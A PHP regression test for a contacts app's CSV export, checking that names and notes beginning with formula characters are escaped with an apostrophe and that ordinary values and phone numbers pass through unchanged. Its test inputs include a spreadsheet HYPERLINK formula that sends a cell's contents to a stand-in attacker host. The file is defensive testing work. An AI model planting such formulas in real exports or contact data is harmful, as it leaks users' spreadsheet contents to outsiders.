<?php

// Run with: php test/contacts-csv-formulas.php
// The CSV export wrote contact fields as they are, so a name like
// =HYPERLINK("https://…","Open") became a live formula in the spreadsheet
// that opened the file. Contacts get such names without the user typing them:
// replying to a message autosaves its sender with the display name they chose.
define('APP_VERSION', 'test');
spl_autoload_register(static function (string $class): void {
	$base = dirname(__DIR__).'/tachyon/v/0.0.0/app/libraries/';
	$file = str_starts_with($class, 'Tachyon\\Util\\')
		? $base.'tachyon_util/'.strtolower(str_replace('\\', '/', substr($class, 13))).'.php'
		: $base.str_replace('\\', '/', $class).'.php';
	if (is_file($file)) {
		require_once $file;
	}
});

function check(bool $condition, string $message): void
{
	if (!$condition) {
		throw new RuntimeException($message);
	}
}

use Sabre\VObject\Component\VCard;
use Tachyon\Providers\AddressBook\Utils;

$row = function (VCard $card) : array {
	$r = fopen('php://memory', 'w+');
	Utils::VCardToCsv($r, $card, true);
	rewind($r);
	$head = fgetcsv($r, 0, ',', '"', '');
	return array_combine($head, fgetcsv($r, 0, ',', '"', ''));
};

foreach (['=HYPERLINK("https://evil.example/?"&A2,"Open")', '+1+1', '-1+1', '@SUM(A1:A9)', "\t=1", "\r=1"] as $name) {
	$card = new VCard;
	$card->FN = $name;
	$card->add('EMAIL', 'x@evil.example');
	$card->add('NOTE', $name);
	$out = $row($card);
	foreach (['Display Name', 'Notes'] as $col) {
		check("'" . $name === $out[$col], "{$col} cell starts a formula: " . json_encode($out[$col]));
	}
}

// Ordinary values, and phone numbers, are unchanged
$card = new VCard;
$card->FN = 'Alice Example';
$card->add('TEL', '+46 8 123 45 67', ['type' => 'CELL']);
$card->add('NOTE', 'met at a conference - call back');
$out = $row($card);
check('Alice Example' === $out['Display Name'], 'an ordinary name changed');
check('+46 8 123 45 67' === $out['Mobile Phone'], 'a phone number changed: ' . $out['Mobile Phone']);
check('met at a conference - call back' === $out['Notes'], 'an ordinary note changed');

echo "contacts-csv-formulas: ok\n";
